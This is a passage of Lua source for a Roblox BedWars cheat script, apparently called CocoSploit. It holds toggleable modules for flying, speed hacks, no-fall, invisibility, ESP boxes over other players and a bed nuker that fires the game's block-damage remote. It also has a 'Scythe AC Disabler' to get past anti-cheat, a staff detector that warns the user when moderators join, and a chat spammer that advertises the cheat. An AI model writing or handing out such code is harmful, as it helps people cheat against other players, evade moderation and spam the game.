    
    game:GetService("ReplicatedStorage"):WaitForChild("rbxts_include"):WaitForChild("node_modules"):WaitForChild("@rbxts"):WaitForChild("net"):WaitForChild("out"):WaitForChild("_NetManaged"):WaitForChild("BedwarsPurchaseItem"):InvokeServer(unpack(args))
end

local function Buyironsword()
    local args = {
        [1] = {
            ["shopItem"] = {
                ["ignoredByKit"] = {
                    [1] = "barbarian",
                    [2] = "dasher",
                    [3] = "frost_hammer_kit",
                    [4] = "tinker"
                },
                ["itemType"] = "iron_sword",
                ["price"] = 70,
                ["superiorItems"] = {
                    [1] = "diamond_sword",
                },
                ["currency"] = "iron",
                ["amount"] = 1,
                ["lockAfterPurchase"] = true,
                ["category"] = "Combat",
                ["disabledInQueue"] = {
                    [1] = "tnt_wars"
                }
            },
            ["shopId"] = "1_item_shop"
        }
    }
    
    game:GetService("ReplicatedStorage"):WaitForChild("rbxts_include"):WaitForChild("node_modules"):WaitForChild("@rbxts"):WaitForChild("net"):WaitForChild("out"):WaitForChild("_NetManaged"):WaitForChild("BedwarsPurchaseItem"):InvokeServer(unpack(args))
end

local function BuyDiamondsword()
    local args = {
        [1] = {
            ["shopItem"] = {
                ["ignoredByKit"] = {
                    [1] = "barbarian",
                    [2] = "dasher",
                    [3] = "frost_hammer_kit",
                    [4] = "tinker"
                },
                ["itemType"] = "diamond_sword",
                ["price"] = 70,
                ["superiorItems"] = {
                    [1] = "emerald_sword",
                },
                ["currency"] = "emerald",
                ["amount"] = 1,
                ["lockAfterPurchase"] = true,
                ["category"] = "Combat",
                ["disabledInQueue"] = {
                    [1] = "tnt_wars"
                }
            },
            ["shopId"] = "1_item_shop"
        }
    }
    
    game:GetService("ReplicatedStorage"):WaitForChild("rbxts_include"):WaitForChild("node_modules"):WaitForChild("@rbxts"):WaitForChild("net"):WaitForChild("out"):WaitForChild("_NetManaged"):WaitForChild("BedwarsPurchaseItem"):InvokeServer(unpack(args))
end

local function BuyleatherArmor()
    local args = {
        [1] = {
            ["shopItem"] = {
                ["lockAfterPurchase"] = true,
                ["itemType"] = "leather_chestplate",
                ["price"] = 50,
                ["customDisplayName"] = "Leather Armor",
                ["superiorItems"] = {
                    [1] = "iron_chestplate"
                },
                ["currency"] = "iron",
                ["amount"] = 1,
                ["category"] = "Combat",
                ["ignoredByKit"] = {
                    [1] = "bigman",
                    [2] = "tinker"
                },
                ["spawnWithItems"] = {
                    [1] = "leather_helmet",
                    [2] = "leather_chestplate",
                    [3] = "leather_boots"
                },
                ["nextTier"] = "iron_chestplate"
            },
            ["shopId"] = "1_item_shop"
        }
    }
    
    game:GetService("ReplicatedStorage"):WaitForChild("rbxts_include"):WaitForChild("node_modules"):WaitForChild("@rbxts"):WaitForChild("net"):WaitForChild("out"):WaitForChild("_NetManaged"):WaitForChild("BedwarsPurchaseItem"):InvokeServer(unpack(args))
end

local function BuyIronArmor()
    local args = {
        [1] = {
            ["shopItem"] = {
                ["lockAfterPurchase"] = true,
                ["itemType"] = "leather_chestplate",
                ["price"] = 50,
                ["customDisplayName"] = "Iron Armor",
                ["superiorItems"] = {
                    [1] = "iron_chestplate"
                },
                ["currency"] = "iron",
                ["amount"] = 1,
                ["category"] = "Combat",
                ["ignoredByKit"] = {
                    [1] = "bigman",
                    [2] = "tinker"
                },
                ["spawnWithItems"] = {
                    [1] = "iron_helmet",
                    [2] = "iron_chestplate",
                    [3] = "iron_boots"
                },
                ["nextTier"] = "diamond_chestplate"
            },
            ["shopId"] = "1_item_shop"
        }
    }
    
    game:GetService("ReplicatedStorage"):WaitForChild("rbxts_include"):WaitForChild("node_modules"):WaitForChild("@rbxts"):WaitForChild("net"):WaitForChild("out"):WaitForChild("_NetManaged"):WaitForChild("BedwarsPurchaseItem"):InvokeServer(unpack(args))
end

local function BuyDiamondArmor()
    local args = {
        [1] = {
            ["shopItem"] = {
                ["lockAfterPurchase"] = true,
                ["itemType"] = "Diamond_chestplate",
                ["price"] = 8,
                ["customDisplayName"] = "Diamond Armor",
                ["superiorItems"] = {
                    [1] = "iron_chestplate"
                },
                ["currency"] = "iron",
                ["amount"] = 1,
                ["category"] = "Combat",
                ["ignoredByKit"] = {
                    [1] = "bigman",
                    [2] = "tinker"
                },
                ["spawnWithItems"] = {
                    [1] = "diamond_helmet",
                    [2] = "diamond_chestplate",
                    [3] = "diamond_boots"
                },
                ["nextTier"] = "diamond_chestplate"
            },
            ["shopId"] = "1_item_shop"
        }
    }
    
    game:GetService("ReplicatedStorage"):WaitForChild("rbxts_include"):WaitForChild("node_modules"):WaitForChild("@rbxts"):WaitForChild("net"):WaitForChild("out"):WaitForChild("_NetManaged"):WaitForChild("BedwarsPurchaseItem"):InvokeServer(unpack(args))
end

AutoBuy = GuiLibrary.API.Windows.Blatant.CreateButton({
	["Name"] = "AutoBuy",
	["Function"] = function(callback)
		if callback then
			CreateNotification("AutoBuy", 1.2, "AutoBuy has been enabled")
			task.spawn(function()
				repeat task.wait(2)
					if hasItem("wood_sword") then
						Buystonesword()
					end
					if hasItem("stone_sword") then
                        wait(1)
						Buyironsword()
					end
                    if hasItem("stone_sword") and not hasItem("iron_chestplate") and not hasItem("diamond_chestplate") and not hasItem("emerald_chestplate") then
                        BuyleatherArmor()
                    end
                    if hasItem("leather_chestplate") then
                        wait(1.3)
				        BuyIronArmor()
			        end
                    if hasItem("stone_sword") and hasItem("iron_chestplate") then
				        Buyironsword()
			        end
                    if hasItem("iron_sword") or hasItem("stone_sword") or hasItem("wood_sword") then
				        BuyDiamondsword()
			        end
                    if hasItem("iron_chestplate") then
				        BuyDiamondArmor()
			        end

				until (not AutoBuy.Enabled)
				CreateNotification("AutoBuy", 1.2, "AutoBuy has been disabled")
			end)
		end
	end,
})

Gravity = GuiLibrary.API.Windows.Blatant.CreateButton({
    ["Name"] = "Gravity",
    ["Function"] = function(callback)
        if callback then
			CreateNotification("Gravity", 1.2, "Gravity has been enabled")
			task.spawn(function()
				repeat task.wait()	
				workspace.Gravity = 72.6
		until (not Gravity.Enabled)
		workspace.Gravity = 196.2
            CreateNotification("Gravity", 1.2, "Gravity has been disabled")
        end)
    end
end
})

HighJump = GuiLibrary.API.Windows.Blatant.CreateButton({
    ["Name"] = "HighJump",
    ["Function"] = function(callback)
        if callback then
            local HighJumpenabled = true

            while HighJumpenabled do
                CreateNotification("HighJump", 1.2, "HighJump has been enabled")
                
                sendPlayerUp()

                HighJumpenabled = Speed.Enabled
                CreateNotification("HighJump", 1.2, "HighJump has been disabled")
            end
        end
    end
})


AutoShield = GuiLibrary.API.Windows.Blatant.CreateButton({
	["Name"] = "AutoInfernalShield",
	["Function"] = function(callback)
		if callback then
			task.spawn(function()
				CreateNotification("AutoInfernalShield", 1.2, "AutoInfernalShield has been enabled")
				repeat task.wait(0.2)
					spoofHand("infernal_shield")
                    local args = {
    [1] = {
        ["raised"] = true
    }
}



game:GetService("ReplicatedStorage"):WaitForChild("rbxts_include"):WaitForChild("node_modules"):WaitForChild("@rbxts"):WaitForChild("net"):WaitForChild("out"):WaitForChild("_NetManaged"):WaitForChild("UseInfernalShield"):FireServer(unpack(args))
				until (not AutoShield.Enabled)
				CreateNotification("AutoInfernalShield", 1.2, "AutoInfernalShield has been disabled")
			end)
		end
	end,
})

ScytheInstaKill = GuiLibrary.API.Windows.Blatant.CreateButton({
    ["Name"] = "SkyScytheInstaKill",
    ["Function"] = function(callback)
        if callback then
			CreateNotification("Sky Scythe InstaKill", 1.2, "Sky Scythe InstaKill has been enabled")
			task.spawn(function()
				repeat task.wait()
			game:GetService("ReplicatedStorage").rbxts_include.node_modules:FindFirstChild("@rbxts").net.out._NetManaged.SkyScytheSpin:FireServer()
		until (not ScytheInstaKill.Enabled)
            CreateNotification("Sky Scythe InstaKill", 1.2, "Sky Scythe InstaKill has been disabled")
        end)
    end
end
})

local function getgrapple()
	local bows = {}
	for i,v in pairs(inventory:GetChildren()) do
		if v.Name:find("grappling_hook") then
			table.insert(bows,v)
		end
	end
	return bows
end

local countdownValue = 2.5
local countdownLabel = nil

local function createUI()
    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Name = "FlightModeUI"
    ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
    
    local Frame_1 = Instance.new("Frame")
    Frame_1.Parent = ScreenGui
    Frame_1.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    Frame_1.BackgroundTransparency = 0.8
    Frame_1.BorderColor3 = Color3.fromRGB(0, 0, 0)
    Frame_1.BorderSizePixel = 0
    Frame_1.Position = UDim2.new(0.5, -116.5, 0.5, -51.5)
    Frame_1.Size = UDim2.new(0, 233, 0, 103)
    
    local UICorner_1 = Instance.new("UICorner")
    UICorner_1.Parent = Frame_1
    UICorner_1.CornerRadius = UDim.new(0, 20)
    
    countdownLabel = Instance.new("TextLabel")
    countdownLabel.Name = "CountdownLabel"
    countdownLabel.Parent = Frame_1
    countdownLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    countdownLabel.BackgroundTransparency = 1
    countdownLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
    countdownLabel.BorderSizePixel = 0
    countdownLabel.Position = UDim2.new(0.5, -100, 0.5, -25)
    countdownLabel.Size = UDim2.new(0, 200, 0, 50)
    countdownLabel.Font = Enum.Font.LuckiestGuy
    countdownLabel.Text = string.format("%.1f", countdownValue)
    countdownLabel.TextScaled = true
    countdownLabel.TextSize = 14
    countdownLabel.TextWrapped = true
    
    local Frame_2 = Instance.new("Frame")
    Frame_2.Parent = ScreenGui
    Frame_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    Frame_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
    Frame_2.BorderSizePixel = 0
    Frame_2.Position = UDim2.new(0.5, -77, 0.5, 20)
    Frame_2.Size = UDim2.new(0, 154, 0, 22)
    
    local UICorner_2 = Instance.new("UICorner")
    UICorner_2.Parent = Frame_2
    UICorner_2.CornerRadius = UDim.new(0, 30)
end

-- 删除UI的函数
local function removeUI()
    local playerGui = game.Players.LocalPlayer:FindFirstChild("PlayerGui")
    if playerGui then
        local flightModeUI = playerGui:FindFirstChild("FlightModeUI")
        if flightModeUI then
            flightModeUI:Destroy()
        end
    end
    countdownLabel = nil
end

-- 更新倒计时的函数
local function updateCountdownUI(value)
    if countdownLabel then
        countdownLabel.Text = string.format("%.1f", value)
    end
end

local Flying = true

local function countdown()
    while Flying and countdownValue > 0 do
        countdownValue = countdownValue - 0.1
        updateCountdownUI(countdownValue)
        wait(0.1)
    end
end

Flight = GuiLibrary.API.Windows.Blatant.CreateButton({
    ["Name"] = "Fly",
    ["Function"] = function(callback)
        if callback then
            local mode = FlightMode.Value
            Flying = true
            createUI() 

            task.spawn(function()
                countdown()
            end)

            task.spawn(function()
				CreateNotification("Fly", 1.2, "Fly has been enabled")
                repeat
                    task.wait()
                    local velo = entity.HumanoidRootPart().Velocity
                    if mode == "Velocity" then
                        local velo = entity.HumanoidRootPart().Velocity
                        entity.HumanoidRootPart().Velocity = Vector3.new(velo.X, 2.2, velo.Z)
                        if game.UserInputService:IsKeyDown(Enum.KeyCode.Space) then
                            entity.HumanoidRootPart().Velocity = Vector3.new(velo.X, 70, velo.Z)
                        end
                        if game.UserInputService:IsKeyDown(Enum.KeyCode.LeftShift) then
                            entity.HumanoidRootPart().Velocity = Vector3.new(velo.X, -70, velo.Z)
                        end
                    elseif mode == "CFrame" then
                        entity.HumanoidRootPart().Velocity = Vector3.new(velo.X, 2.2, velo.Z)
                        if game.UserInputService:IsKeyDown(Enum.KeyCode.Space) then
                            entity.HumanoidRootPart().CFrame += Vector3.new(0, 7, 0)
                            entity.HumanoidRootPart().Velocity = Vector3.new(velo.X, 10, velo.Z)
                        end
                        if game.UserInputService:IsKeyDown(Enum.KeyCode.LeftShift) then
                            entity.HumanoidRootPart().CFrame += Vector3.new(0, -7, 0)
                            entity.HumanoidRootPart().Velocity = Vector3.new(velo.X, -10, velo.Z)
                        end
                    elseif mode == "Heatseeker" then
                        -- Heatseeker模式的代码
                    end
                until not Flying

                Flying = false
                countdownValue = 2.5
                removeUI()
            end)
        else
            Flying = false
            countdownValue = 2.5
            removeUI()
			CreateNotification("Fly", 1.2, "Fly has been disabled")
        end
    end,
})



FlightMode = Flight.CreatePicker({
	["Name"] = "Mode",
	["Function"] = function()

	end,
	["Options"] = {"Velocity","CFrame","Heatseeker"}
})


local GroundHit = getRemote("GroundHit")
NoFall = GuiLibrary.API.Windows.Blatant.CreateButton({
	["Name"] = "NoFall",
	["Function"] = function(callback)
		if callback then
			task.spawn(function()
				CreateNotification("NoFall", 1.2, "NoFall has been enabled")
				repeat task.wait(0.2)
					GroundHit:FireServer()
				until (not NoFall.Enabled)
				CreateNotification("NoFall", 1.2, "NoFall has been disabled")
			end)
		end
	end,
})


local theanimmethod
InvisibleExploit = GuiLibrary.API.Windows.Blatant.CreateButton({
	["Name"] = "InvisibleExploit",
	["Function"] = function(callback)
		if callback then
			CreateNotification("Invisible", 1.2, "Invisible has been enabled")
			if InvisMethod.Value == "1" then
				theanimmethod = Instance.new("Animation")
				theanimmethod.AnimationId = "rbxassetid://11335949902"
				local track = Humanoid.Animator:LoadAnimation(theanimmethod)
				repeat
					track:Play()
					task.wait()
				until not InvisibleExploit.Enabled
			end

			if InvisMethod.Value == "2" then
				theanimmethod = Instance.new("Animation")
				theanimmethod.AnimationId = "rbxassetid://11360825341"
				local track = Humanoid.Animator:LoadAnimation(theanimmethod)
				repeat
					track:Play()
					task.wait()
				until not InvisibleExploit.Enabled
			end
		else
			pcall(function()
				theanimmethod:Remove()
			end)
			CreateNotification("Invisible", 1.2, "Invisible has been disabled")
		end
	end,
})
InvisMethod = InvisibleExploit.CreatePicker({
	Name = "Method",
	Options = {"1", "2"}
})

DragonBreathExploit = GuiLibrary.API.Windows.Blatant.CreateButton({
	["Name"] = "DragonBreathExploit",
	["Function"] = function(callback)
		if callback then
			task.spawn(function()
				CreateNotification("Dragon Breath", 1.2, "Dragon Breath has been enabled")
				repeat task.wait(0.2)
                game:GetService("ReplicatedStorage").rbxts_include.node_modules:FindFirstChild("@rbxts").net.out._NetManaged.DragonBreath:FireServer({
							["Player"] = game:GetService("Players").LocalPlayer
				})
				until (not DragonBreathExploit.Enabled)
				CreateNotification("Dragon Breath", 1.2, "Dragon Breath has been disabled")
			end)
		end
	end,
})

Speed = GuiLibrary.API.Windows.Blatant.CreateButton({
    ["Name"] = "Speed",
    ["Function"] = function(callback)
        if callback then
			task.spawn(function()
				CreateNotification("Speed", 1.2, "Speed has been enabled")
				repeat task.wait(0.2)

                
                local mode = SpeedMode.Value

                if mode == "Normal" then
                    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 23
                elseif mode == "Light Step" then
                    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 26
                end

			until (not Speed.Enabled)
			CreateNotification("Speed", 1.2, "Speed has been disabled")
            end)
        end
	end,
})
SpeedMode = Speed.CreatePicker({
    ["Name"] = "Mode",
    ["Function"] = function()

    end,
    ["Options"] = {"Normal","Light Step"}
})

FOV = GuiLibrary.API.Windows.Blatant.CreateButton({
	["Name"] = "FOV",
	["Function"] = function(callback)
		if callback then
			CreateNotification("FOV", 1.2, "FOV has been enabled")
			task.spawn(function()
				repeat task.wait(0.2)
                game.Workspace.CurrentCamera.FieldOfView = 135
				until (not FOV.Enabled)
				CreateNotification("FOV", 1.2, "FOV has been disabled")
			end)
		end
	end,
})

local scaffoldRun
Scaffold = GuiLibrary.API.Windows.Blatant.CreateButton({
	["Name"] = "Scaffold",
	["Function"] = function(callback)
		if callback then
			task.spawn(function()
				CreateNotification("Scaffold", 1.2, "Scaffold has been enabled")
				scaffoldRun = game["Run Service"].RenderStepped:Connect(function()
					if game.UserInputService:IsKeyDown(Enum.KeyCode.Space) then
						local velo = lplr.Character.PrimaryPart.Velocity
						lplr.Character.PrimaryPart.Velocity = Vector3.new(velo.X,10,velo.Z)
					end
					local block = getWool()
					placeBlock((lplr.Character.PrimaryPart.CFrame + lplr.Character.PrimaryPart.CFrame.LookVector * 1) - Vector3.new(0,4.5,0),block)
					if not Scaffold.Enabled then return end
					placeBlock((lplr.Character.PrimaryPart.CFrame + lplr.Character.PrimaryPart.CFrame.LookVector * 2) - Vector3.new(0,4.5,0),block)
					if not Scaffold.Enabled then return end
					placeBlock((lplr.Character.PrimaryPart.CFrame + lplr.Character.PrimaryPart.CFrame.LookVector * 3) - Vector3.new(0,4.5,0),block)
				end)
			end)
		else
			pcall(function()
				scaffoldRun:Disconnect()
			end)
			CreateNotification("Scaffold", 1.2, "Scaffold has been disabled")
		end
	end,
})

InfiniteJump = GuiLibrary.API.Windows.Blatant.CreateButton({
    ["Name"] = "InfiniteJump",
    ["Function"] = function(callback)
        if callback then
			CreateNotification("InfiniteJump", 1.2, "InfiniteJump has been enabled")
            task.spawn(function()
            repeat task.wait(0.2)
game:GetService("UserInputService").JumpRequest:connect(function()
    if InfiniteJump.Enabled then
        game:GetService"Players".LocalPlayer.Character:FindFirstChildOfClass'Humanoid':ChangeState("Jumping")
    end
end)
                until (not InfiniteJump.Enabled)
				CreateNotification("InfiniteJump", 1.2, "InfiniteJump has been disabled")
            end)
        end
    end,
})

local ConsumeRemote = getRemote("ConsumeItem")
AutoConsume = GuiLibrary.API.Windows.Utility.CreateButton({
	["Name"] = "AutoConsume",
	["Function"] = function(callback)
		if callback then
			CreateNotification("AutoConsume", 1.2, "AutoConsume has been enabled")
			task.spawn(function()
				repeat task.wait()
					if hasItem("speed_potion") then
						ConsumeRemote:InvokeServer({
							["item"] = inventory:WaitForChild("speed_potion")
						})
					end
					if hasItem("pie") then
						ConsumeRemote:InvokeServer({
							["item"] = inventory:WaitForChild("pie")
						})
					end
				until (not AutoConsume.Enabled)
				CreateNotification("AutoConsume", 1.2, "AutoConsume has been disabled")
			end)
		end
	end,
})

AutoHeal = GuiLibrary.API.Windows.Utility.CreateButton({
    ["Name"] = "AutoHeal",
    ["Function"] = function(callback)
        if callback then
            CreateNotification("AutoHeal", 1.2, "AutoHeal has been enabled")
            task.spawn(function()
                repeat
                    task.wait()
                    local player = game.Players.LocalPlayer
                    local character = player.Character or player.CharacterAdded:Wait()
                    local humanoid = character:FindFirstChildOfClass("Humanoid")

                    if humanoid and humanoid.Health < 75 then
                        if hasItem("apple") then
                            ConsumeRemote:InvokeServer({
                                ["item"] = inventory:WaitForChild("apple")
                            })
                        end
                    end
                until not AutoHeal.Enabled
                CreateNotification("AutoHeal", 1.2, "AutoHeal has been disabled")
            end)
        end
    end,
})

AntiDeath = GuiLibrary.API.Windows.Utility.CreateButton({
    ["Name"] = "AntiDeath",
    ["Function"] = function(callback)
        if callback then
            CreateNotification("AntiDeath", 1.2, "AntiDeath has been enabled")
			task.spawn(function()
			repeat task.wait()

                    local player = game.Players.LocalPlayer
                    local character = player.Character or player.CharacterAdded:Wait()
                    local humanoid = character:FindFirstChildOfClass("Humanoid")

                    if humanoid and humanoid.Health < 21 then
						sendPlayerUp()
						wait(2.8)
					end
				until (not AntiDeath.Enabled)
                CreateNotification("AntiDeath", 1.2, "AntiDeath has been disabled")
			end)
        end
    end,
})

ChatSpammer = GuiLibrary.API.Windows.Utility.CreateButton({
    ["Name"] = "ChatSpammer",
    ["Function"] = function(callback)
        if callback then
            CreateNotification("ChatSpammer", 1.2, "ChatSpammer has been enabled")
			task.spawn(function()
			repeat task.wait(3)

                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("CocoSploit On Top // FqrVKaHnaw", "All")
				task.wait(3)
				game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Break some beds with CocoSploit // FqrVKaHnaw", "All")
				task.wait(3)
				game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Get some wins with CocoSploit // FqrVKaHnaw", "All")
					
				until (not ChatSpammer.Enabled)
                CreateNotification("ChatSpammer", 1.2, "ChatSpammer has been disabled")
			end)
        end
    end,
})

ScytheDisabler = GuiLibrary.API.Windows.Utility.CreateButton({
    ["Name"] = "Scythe AC Disabler",
    ["Function"] = function(callback)
        if callback then
            local Bypassmode = Bypassmode.Value
            CreateNotification("Scythe AC Disabler", 1.2, "Scythe AC Disabler has been enabled")
            task.spawn(function()
                repeat task.wait()
                    if Bypassmode == "Heatseeker" then
                        local args = {
                            [1] = {
                                ["direction"] = Vector3.new(0.46722307801246643, -1.769954627306447e-09, -0.8841394782066345)
                            }
                        }
                        game:GetService("ReplicatedStorage").rbxts_include.node_modules:FindFirstChild("@rbxts").net.out._NetManaged.ScytheDash:FireServer(unpack(args))
                        game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 40

                        task.wait(0.15)
                        game:GetService("ReplicatedStorage").rbxts_include.node_modules:FindFirstChild("@rbxts").net.out._NetManaged.ScytheDash:FireServer(unpack(args))
                        
                        task.wait(0.15)
                        game:GetService("ReplicatedStorage").rbxts_include.node_modules:FindFirstChild("@rbxts").net.out._NetManaged.ScytheDash:FireServer(unpack(args))
                        
                        task.wait(0.15)
                        game:GetService("ReplicatedStorage").rbxts_include.node_modules:FindFirstChild("@rbxts").net.out._NetManaged.ScytheDash:FireServer(unpack(args))
                        
                        task.wait(0.15)
                        game:GetService("ReplicatedStorage").rbxts_include.node_modules:FindFirstChild("@rbxts").net.out._NetManaged.ScytheDash:FireServer(unpack(args))
                        
                        game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 18.5
                        
                        task.wait(0.175)
                        game:GetService("ReplicatedStorage").rbxts_include.node_modules:FindFirstChild("@rbxts").net.out._NetManaged.ScytheDash:FireServer(unpack(args))
                        
                        task.wait(0.175)
                        game:GetService("ReplicatedStorage").rbxts_include.node_modules:FindFirstChild("@rbxts").net.out._NetManaged.ScytheDash:FireServer(unpack(args))
                        
                        task.wait(0.175)
                        game:GetService("ReplicatedStorage").rbxts_include.node_modules:FindFirstChild("@rbxts").net.out._NetManaged.ScytheDash:FireServer(unpack(args))
                        
                        task.wait(0.175)
                        game:GetService("ReplicatedStorage").rbxts_include.node_modules:FindFirstChild("@rbxts").net.out._NetManaged.ScytheDash:FireServer(unpack(args))
                    elseif Bypassmode == "CFrame" then
                        game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 28
                        local args = {
                            [1] = {
                                ["direction"] = Vector3.new(0.46722307801246643, -1.769954627306447e-09, -0.8841394782066345)
                            }
                        }
                        game:GetService("ReplicatedStorage").rbxts_include.node_modules:FindFirstChild("@rbxts").net.out._NetManaged.ScytheDash:FireServer(unpack(args))
                    end
                until (not ScytheDisabler.Enabled)
                CreateNotification("Scythe AC Disabler", 1.2, "Scythe AC Disabler has been disabled")
                resetSpeed()
            end)
        end
    end,
})
Bypassmode = ScytheDisabler.CreatePicker({
	Name = "Mode",
	Options = {"Heatseeker", "CFrame"}
})

local function getGroupRank(plr:Player)
	return plr:GetRankInGroup(5774246)
end

local staffdetectorcon
StaffDetector = GuiLibrary.API.Windows.Utility.CreateButton({
	["Name"] = "StaffDetector",
	["Function"] = function(callback)
		if callback then
            CreateNotification("StaffDetector", 1.2, "StaffDetector has been enabled")
			task.wait(1)

			staffdetectorcon = game.Players.PlayerAdded:Connect(function(plr)

				if getGroupRank(plr) >= 2 then
					CreateNotificationStaffDetector("StaffDetector", 30, "Staff " .. plr.Name .. " Has Joined The Game !!!")
					writefile("Staff_Detection_GroupID", plr.Name)
				end
			end)
		else
			pcall(function()
				staffdetectorcon:Disconnect()
                CreateNotification("StaffDetector", 1.2, "StaffDetector has been disabled")
			end)
		end
	end,
})

local DamageBlock = getRemote("DamageBlock")
local function breakBlock(v,optionalPos)
	local args = {
		[1] = {
			["blockRef"] = {
				["blockPosition"] = Vector3.new(v.Position.X / 3, v.Position.Y / 3, v.Position.Z / 3)
			},
			["hitPosition"] = v.Position,
			["hitNormal"] = Vector3.new(-1, 0, 0)
		}
	}

	DamageBlock:InvokeServer(unpack(args))
end

local nukerBlocksAllowed = {"bed"}

local function getNukerBlocks()
	local beds = {}
	for i,v in pairs(workspace:GetChildren()) do
		if table.find(nukerBlocksAllowed,v.Name) then
			table.insert(beds,v)
		end
	end
	return beds
end

local nukerblocks = getNukerBlocks()
Nuker = GuiLibrary.API.Windows.Utility.CreateButton({
	["Name"] = "BedNuker",
	["Function"] = function(callback)
		if callback then
            CreateNotification("BedNuker", 1.2, "BedNuker has been enabled")
			task.spawn(function()
				repeat task.wait()
					for i,v in pairs(nukerblocks) do
						if (v.Position - lplr.Character.PrimaryPart.Position).Magnitude <= 30 then
							pcall(function()
								breakBlock(v)
							end)
						end
					end
				until (not Nuker.Enabled)
                CreateNotification("BedNuker", 1.2, "BedNuker has been disabled")
			end)
		end
	end,
})

local function isVisible(targetPos)
	local targetScreenPos, onScreen = workspace.Camera:WorldToScreenPoint(targetPos)
	return onScreen and targetScreenPos.Z > 0
end

local ESPboxes = {}
ESP = GuiLibrary.API.Windows.World.CreateButton({
	["Name"] = "ESP",
	["Function"] = function(callback)
		if callback then
			CreateNotification("ESP", 1.2, "ESP has been enabled")
			task.spawn(function()
				repeat task.wait()
					for i, v in pairs(ESPboxes) do
						v:Remove()
					end
					ESPboxes = {}

					local players = game.Players:GetPlayers()
					for i, v in pairs(players) do
						if v ~= lplr and v.Character and v.Character:FindFirstChild("HumanoidRootPart") then
							local targetPosition = v.Character.HumanoidRootPart.Position

							if isVisible(targetPosition) then
								local targetScreenPosition = workspace.CurrentCamera:WorldToScreenPoint(targetPosition)
								local size = (1 / (targetPosition - workspace.CurrentCamera.CFrame.Position).Magnitude) * 3000

								local espBox = Drawing.new("Square")
								espBox.Visible = true
								espBox.Color = Color3.fromRGB(255, 0, 0)
								espBox.Thickness = 2
								espBox.Size = Vector2.new(size, size)

								local yOffset = (1 / (targetPosition - workspace.CurrentCamera.CFrame.Position).Magnitude) * 1000
								espBox.Position = Vector2.new(targetScreenPosition.X - size / 2, targetScreenPosition.Y - size + yOffset)

								table.insert(ESPboxes, espBox)
							end
						end
					end

				until (not ESP.Enabled)
				CreateNotification("ESP", 1.2, "ESP has been disabled")
			end)
		else
			task.spawn(function()
				repeat task.wait()
					pcall(function()
						for i, v in pairs(ESPboxes) do
							v:Remove()
						end
						ESPboxes = {}
					end)
				until false
			end)
		end
	end,
})

local lighting = game:GetService("Lighting")

Night = GuiLibrary.API.Windows.World.CreateButton({
	["Name"] = "Night",
	["Function"] = function(callback)
		if callback then
			CreateNotification("Night", 1.2, "Night has been enabled")
			task.spawn(function()
				repeat task.wait(0.2)
					lighting.ClockTime = 0 
					lighting.Brightness = 2  
					lighting.OutdoorAmbient = Color3.fromRGB(128, 128, 128)  
				until (not Night.Enabled)
				CreateNotification("Night", 1.2, "Night has been disabled")
				lighting.ClockTime = 14
			end)
		end
	end,
})

local player = game.Players.LocalPlayer
local camera = game.Workspace.CurrentCamera

Atmosphere = GuiLibrary.API.Windows.World.CreateButton({
	["Name"] = "Atmosphere",
	["Function"] = function(callback)
		if callback then
			CreateNotification("Atmosphere", 1.2, "Atmosphere has been enabled")
			task.spawn(function()
				repeat task.wait(0.2)

local existingEffect = camera:FindFirstChildOfClass("ColorCorrectionEffect")
if existingEffect then
    existingEffect:Destroy()
end


local colorCorrection = Instance.new("ColorCorrectionEffect")
colorCorrection.Parent = camera
colorCorrection.TintColor = Color3.fromRGB(138, 43, 226)  
colorCorrection.Brightness = 0  
colorCorrection.Contrast = 0  
				until (not Atmosphere.Enabled)
				CreateNotification("Atmosphere", 1.2, "Atmosphere has been disabled")
				
local existingEffect = camera:FindFirstChildOfClass("ColorCorrectionEffect")
if existingEffect then
    existingEffect:Destroy()
                end
			end)
		end
	end,
})

AntiVoid = GuiLibrary.API.Windows.World.CreateButton({
	["Name"] = "AntiVoid",
	["Function"] = function(callback)
		if callback then
			CreateNotification("AntiVoid", 1.2, "AntiVoid has been enabled")
			task.spawn(function()
				repeat task.wait(0.2)
					local player = game.Players.LocalPlayer
					local character = player.Character or player.CharacterAdded:Wait()
					
					local function spawnPartUnderPlayer()
						local part = game.Workspace:FindFirstChild("JumpPart")
					
						if not part then
							part = Instance.new("Part")
							part.Name = "JumpPart"
							part.Size = Vector3.new(2048, 1, 2048)
							part.Anchored = true
							local playerPosition = character.PrimaryPart.Position
							part.Position = Vector3.new(playerPosition.X, playerPosition.Y - 18, playerPosition.Z)
							part.BrickColor = BrickColor.new("Bright violet")
							part.Transparency = 0.7
							part.Parent = game.Workspace
						end
					
						local function onTouch(hit)
							local character = hit.Parent
							local humanoid = character and character:FindFirstChildOfClass("Humanoid")
							if humanoid then
								local jumpVelocity = Vector3.new(0, math.sqrt(2 * 100 * 196.25) * 0.5, 0)
								humanoid.RootPart.Velocity = jumpVelocity
							end
						end
					
						part.Touched:Connect(onTouch)
					
						function partDestroy()
							if part then
								part:Destroy()
								part = nil
							end
						end
					end
					
					spawnPartUnderPlayer()
					
					
				until (not AntiVoid.Enabled)
				CreateNotification("AntiVoid", 1.2, "AntiVoid has been disabled")
				partDestroy()
			end)
		end
	end,
})




local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

function IsAlive(plr)
    plr = plr or LocalPlayer
    if not plr.Character then return false end
    if not plr.Character:FindFirstChild("Humanoid") then return false end
    if plr.Character:FindFirstChild("Humanoid").Health <= 0 then return false end
    return true
end

function GetClosestPlayer()
    local target = nil
    local distance = 25
    for _,v in pairs(Players:GetPlayers()) do
        if v ~= LocalPlayer and v.Team ~= LocalPlayer.Team and IsAlive(v) and not v.Character:FindFirstChildOfClass("ForceField") then
